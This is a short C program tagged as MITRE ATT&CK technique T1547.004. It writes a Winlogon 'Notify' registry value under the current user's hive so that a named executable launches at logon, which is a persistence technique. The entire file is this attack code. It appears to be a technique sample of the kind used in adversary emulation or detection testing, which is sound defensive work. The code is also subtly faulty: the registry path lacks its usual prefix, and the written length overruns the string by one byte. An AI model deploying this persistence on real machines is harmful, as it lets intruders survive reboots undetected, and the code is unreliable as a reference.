// Link      = https://attack.mitre.org/techniques/T1547/004/
// Technique = Boot or Logon Autostart Execution: Winlogon Helper DLL
// ID        = T1547.004
// Tactics   = Persistence,

#include <windows.h>

#define KEY_PATH "Windows NT\\CurrentVersion\\Winlogon"

#define TO_RUN "c:\\data\\my_runner.exe"

int main() {
    HKEY hKey;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, KEY_PATH, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return 1;
    }
    RegSetValueExA(hKey, "Notify", 0, REG_SZ, (const BYTE*)TO_RUN, sizeof(TO_RUN) + 1);
    RegCloseKey(hKey);

    return 0;
}
